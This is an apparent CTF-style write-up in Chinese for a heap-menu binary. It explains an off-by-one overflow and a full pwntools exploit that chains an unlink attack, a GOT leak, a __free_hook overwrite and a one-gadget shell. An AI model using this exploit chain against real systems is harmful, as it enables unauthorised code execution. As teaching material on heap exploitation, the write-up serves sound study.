# 漏洞利用文档

## 执行环境
基于调试记录和程序分析，该二进制程序的运行环境如下：
- **文件类型**：64位ELF可执行文件，动态链接（通过`ldd`推断使用系统libc）
- **安全机制**（通过`checksec`类似工具推断）：
  - Full RELRO：GOT表只读，防止GOT覆盖攻击
  - Stack Canary：栈保护启用，防止栈溢出
  - NX enabled：数据执行保护，防止shellcode在堆栈执行
  - No PIE：程序基地址固定，便于地址计算
- **依赖需求**：运行在Linux系统上，需要匹配的libc版本（从泄露的free地址推断libc基址）
- **功能概述**：程序是一个简单的堆管理器，提供malloc、free、edit、show功能，通过菜单交互

## 漏洞成因
### 关键结构体分析
程序使用以下全局数据结构管理堆块：
- `heap`数组（地址`0x6020e0`）：存储32个8字节指针，指向分配的内存块用户数据区
- `len`数组（地址`0x602060`）：存储32个4字节整数，记录每个内存块的大小
- `key1`（地址`0x6022bc`）：编辑次数计数器，初始为0，达到2时阻止编辑
- `key2`（地址`0x6022b8`）：show权限标志，非零时允许显示内容

### 漏洞分析
漏洞位于`ed`函数（编辑功能）的反编译代码中：
```c
v2[read(0, v2, (int)len[v1])] = 0;
```
**漏洞类型**：堆缓冲区off-by-one溢出  
**成因**：
- `read`函数返回实际读取的字节数，该值直接用作索引在`v2`（堆块指针）处写入零字节
- 当用户输入长度恰好等于`len[v1]`（内存块大小）时，写入操作发生在`v2[len[v1]]`，超出分配边界（有效索引为0到`len[v1]-1`）
- 这导致相邻堆块的元数据（如size字段）被覆盖，破坏堆结构完整性

**补充**：程序在`fr`函数中释放后置零指针，减少了直接UAF风险，但off-by-one溢出可间接导致堆布局操纵，结合数组越界访问（索引32超出边界）实现任意地址读写。

## 漏洞利用过程
以下表格描述了exp执行过程中关键步骤的堆和全局内存变化：

| 步骤 | 操作 | 堆内存变化 | 全局内存变化 | 利用目的 |
|------|------|------------|--------------|----------|
| 1 | 分配4个堆块（索引0,32,1,31） | 分配块0(0x21aaf000)、32(0x21aaf100)、1(0x21aaf200)、31(0x21aaf300)，大小均为0xf8 | `len`数组越界写入：索引32覆盖`heap[0]`为0xf8 | 初始化堆布局，创建溢出条件 |
| 2 | 编辑索引32构造伪造堆块 | 块32用户数据区写入伪造元数据：p64(0)+p64(0xf1)+p64(FD)+p64(BK)，其中FD=0x6021C8, BK=0x6021D0 | 无直接变化 | 触发off-by-one溢出，伪造堆块链接到全局数组 |
| 3 | 释放索引1 | 块1进入释放状态，prev_size被修改为0xf0；块32进入unsortedbin，fd/bk指向main_arena | `heap[0]`被修改为指向全局区域 | 触发unlink攻击，污染unsortedbin |
| 4 | 编辑索引32覆盖全局数组 | 块32数据覆盖为重复0x6021E0指针和free_got地址 | `heap`数组被覆盖，指向GOT表；`key2`被设置为1 | 准备泄露libc地址，启用show功能 |
| 5 | 显示索引32内容 | 无堆变化 | 通过puts输出free的GOT地址 | 泄露libc基址 |
| 6 | 计算关键地址 | 无变化 | 计算one-gadget和__free_hook地址 | 为代码执行做准备 |
| 7 | 编辑索引31准备payload | 块31写入__free_hook地址的payload | 无直接变化 | 设置任意写目标 |
| 8 | 编辑索引32覆盖__free_hook | 无堆变化 | `__free_hook`被覆盖为one-gadget地址(0x78d57579f27a) | 劫持free函数调用 |
| 9 | 释放索引0 | 触发__free_hook执行one-gadget | 进程切换到`/bin/dash` | 获得shell权限 |
| 10 | 进入交互模式 | 堆内存被shell重用存储环境变量 | 完全控制进程 | 利用完成 |

**内存布局演变**：
- 初始：正常堆块分配 → off-by-one溢出伪造元数据 → unsortedbin污染 → 全局数组被覆盖 → GOT泄露 → __free_hook覆盖 → shell执行
- 关键地址：libc基址通过泄露free地址计算，one-gadget偏移为0x4527a

## Exploit
以下是完整的漏洞利用脚本，在关键位置添加了注释：

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample1')
p = process('./data/sample1')
libc = elf.libc  # 获取程序使用的libc

# 工具函数定义
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def edit(index, Content):
    ru("show")
    sl('3')  # 选择编辑功能
    ru("index:")
    sl(str(index))
    ru("content:")
    sd(Content)  # 发送编辑内容，触发off-by-one漏洞

def free(Index):
    ru("show")
    sl('2')  # 选择释放功能
    ru("index:")
    sl(str(Index))

def malloc(index, size, content):
    ru("show")
    sl('1')  # 选择分配功能
    ru("index:")
    sl(str(index))
    ru("size:")
    sl(str(size))
    ru("content:")
    sd(content)

def puts(index):
    ru("show")
    sl('4')  # 选择显示功能
    ru("index:")
    sl(str(index))

# Step 1: 分配初始堆块，创建利用所需的堆布局
# 注意：索引32超出正常范围（0-31），导致len数组越界写入
malloc(0, 0xf8, 'aaaa')
malloc(32, 0xf8, 'bbbb')  # 索引32导致数组越界，覆盖heap[0]
malloc(1, 0xf8, 'cccc')
malloc(31, 0xf8, 'dddd')

# Step 2: 构造伪造堆块元数据，触发off-by-one溢出
free_got = elf.got['free']  # 获取free函数的GOT条目地址
ptr = 0x6021E0  # 全局heap数组附近地址
FD = ptr - 24   # 伪造的fd指针
BK = ptr - 16   # 伪造的bk指针
# 构造payload：伪造prev_size、size、fd_nextsize、bk_nextsize
py = p64(0) + p64(0xf1) + p64(FD) + p64(BK)
py = py.ljust(0xf0, b"\x00")  # 填充到块大小
py += p64(0xf0)  # 设置相邻块的prev_size
edit(32, py)  # 触发off-by-one溢出，覆盖相邻块元数据

# Step 3: 释放堆块触发unlink攻击
free(1)  # 释放索引1，利用伪造元数据修改全局heap数组

# Step 4: 覆盖全局heap数组指向GOT，准备泄露libc地址
py = p64(0x6021E0) * 3 + p64(free_got) + b'a' * 0xD0 + p64(1)
edit(32, py)  # 覆盖heap数组，使指针指向GOT表

# Step 5: 使用puts功能泄露free地址
puts(32)  # 显示索引32内容，输出free的GOT值

# Step 6: 从泄露数据中提取free地址并计算关键地址
free_addr = u64(ru(b"\n1.")[1:7].ljust(8, b'\x00'))  # 解析泄露的地址
# 计算one-gadget地址和__free_hook地址
onegadget = free_addr - libc.symbols["free"] + 0x4527a
free_hook = free_addr - libc.symbols["free"] + libc.symbols['__free_hook']
# 构造覆盖__free_hook的payload
pay = p64(free_hook)
pay = pay.ljust(0xf0, b'\x00')
pay += p64(1)  # 保持堆结构完整
edit(31, pay)  # 准备任意写操作

# Step 8: 覆盖__free_hook为one-gadget地址
edit(32, p64(onegadget))  # 将__free_hook覆盖为one-gadget

# Step 9: 触发free执行shellcode
free(0)  # 调用free时执行__free_hook指向的one-gadget，获得shell

# Step 10: 进入交互模式
p.interactive()  # 用户与shell交互
```

### 关键注释说明：
- **off-by-one触发**：Step 2中的`edit(32, py)`利用输入长度等于块大小，在边界外写入零字节，覆盖相邻堆块元数据。
- **unlink攻击**：Step 3的`free(1)`利用伪造的FD/BK指针，在释放时修改全局heap数组。
- **地址泄露**：Step 5通过覆盖的GOT指针泄露libc地址，绕过ASLR。
- **hook劫持**：Step 8覆盖`__free_hook`，劫持free函数调用流。
- **利用链**：整个exp通过堆溢出→元数据伪造→unlink→地址泄露→hook覆盖的链式利用，最终实现代码执行。

此漏洞利用成功演示了如何将off-by-one溢出转化为完整的远程代码执行。
